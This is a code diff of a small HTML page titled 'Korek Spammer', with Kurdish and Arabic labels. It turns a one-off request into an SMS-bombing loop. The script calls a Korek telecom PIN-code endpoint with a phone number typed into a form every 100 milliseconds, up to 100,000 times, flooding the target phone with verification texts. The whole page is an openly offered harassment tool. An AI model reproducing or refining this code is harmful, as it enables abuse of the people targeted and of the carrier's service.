@@ -7,88 +7,99 @@
 <title>Korek Spammer</title>
 <style>
 body {
-display: flex;
-justify-content: center;
-align-items: center;
-height: 100vh;
-margin: 0;
-font-family: Arial, sans-serif;
-background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
 }
 .container {
-background-color: #fff;
-border-radius: 8px;
-box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-padding: 20px;
-max-width: 400px;
-width: 100%;
-text-align: center;
+    background-color: #fff;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    padding: 20px;
+    max-width: 400px;
+    width: 100%;
+    text-align: center;
 }
 h2 {
-color: #333;
+    color: #333;
 }
 input[type="text"] {
-width: 100%;
-padding: 10px;
-margin: 10px 0;
-border-radius: 4px;
-border: 1px solid #ccc;
-font-size: 16px;
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+    font-size: 16px;
 }
 button {
-background-color: #4CAF50;
-color: white;
-padding: 10px 15px;
-border: none;
-border-radius: 4px;
-cursor: pointer;
-font-size: 16px;
+    background-color: #4CAF50;
+    color: white;
+    padding: 10px 15px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 16px;
 }
 button:hover {
-background-color: #45a049;
+    background-color: #45a049;
 }
 #response {
-margin-top: 20px;
-font-size: 16px;
+    margin-top: 20px;
+    font-size: 16px;
 }
 .success {
-color: green;
-font-weight: bold;
+    color: green;
+    font-weight: bold;
 }
 .error {
-color: red;
-font-weight: bold;
+    color: red;
+    font-weight: bold;
 }
 </style>
 </head>
 <body>
 <div class="container">
-<h2> سپامی کۆڕەک لەلایەن یوسف الکردي 📞</h2><input type="text" id="phone" placeholder="ژمارەی تەلەفونت بنوسەبەم شێوە 96475"> <button onclick="sendRequest()"> بینێرە بەس لەخوا بترسە زۆر مەنێرە با بەعایلەتا نەیەنە خوارۆ 📥 </button>
-<div id="response"></div>
+    <h2> سپامی کۆڕەک لەلایەن یوسف الکردي 📞</h2>
+    <input type="text" id="phone" placeholder="ژمارەی تەلەفونت بنوسەبەم شێوە 96475">
+    <button onclick="startSending()"> بینێرە بەس لەخوا بترسە زۆر مەنێرە با بەعایلەتا نەیەنە خوارۆ 📥 </button>
+    <div id="response"></div>
 </div>
 <script>
-function sendRequest() {
-const phone = document.getElementById("phone").value;
-const url = `https://captainkorek.tornest.net:9337/user/requestPinCode/${phone}/en/WC-Web-App-3af79c12-9c9b-4d73-afe3-as3er455tmfr`;
+let sentMessages = 0; //  ژمارەی نامەی نێردراو
+let maxMessages = 100000; //  ژمارەی ئەو نامانەی ئەتەوێ بینێری
+let interval;
 
-fetch(url)
-.then(response => response.json())
-.then(data => {
-const responseElement = document.getElementById("response");
+function startSending() {
+    const phone = document.getElementById("phone").value;
+    const url = `https://captainkorek.tornest.net:9337/user/requestPinCode/${phone}/en/WC-Web-App-3af79c12-9c9b-4d73-afe3-as3er455tmfr`;
 
-// Check if the response matches the expected success structure
-if (data.status === "Success" && data.msg === "OK") {
-responseElement.innerText = "باشە ڕۆشت بەس لەخوا بترسە زۆر مەنێرە ✅";
-responseElement.className = "success"; // Add success styling
-} else {
-responseElement.innerText = "نەڕۆشت ❌";
-responseElement.className = "error"; // Add error styling
-}
-})
-.catch(error => {
-document.getElementById("response").innerText = "BAD ❌";
-document.getElementById("response").className = "error"; // Add error styling
-});
+    interval = setInterval(() => {
+        if (sentMessages >= maxMessages) {
+            clearInterval(interval);
+            return;
+        }
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                const responseElement = document.getElementById("response");
+                sentMessages++; // زيادة العداد عند إرسال رسالة
+                if (data.status === "Success" && data.msg === "OK") {
+                    responseElement.innerText += `نامە ${sentMessages}: باشە ڕۆشت بەس لەخوا بترسە زۆر مەنێرە ✅\n`;
+                } else {
+                    responseElement.innerText += `رسالة ${sentMessages}: نەڕۆشت ❌\n`;
+                }
+            })
+            .catch(error => {
+                const responseElement = document.getElementById("response");
+                sentMessages++; // زيادة العداد عند حدوث خطأ
+                responseElement.innerText += `رسالة ${sentMessages}: BAD ❌\n`;
+            });
+    }, 100); // تأخير 1 مللي ثانية بين كل طلب
 }
 </script>
 </body>
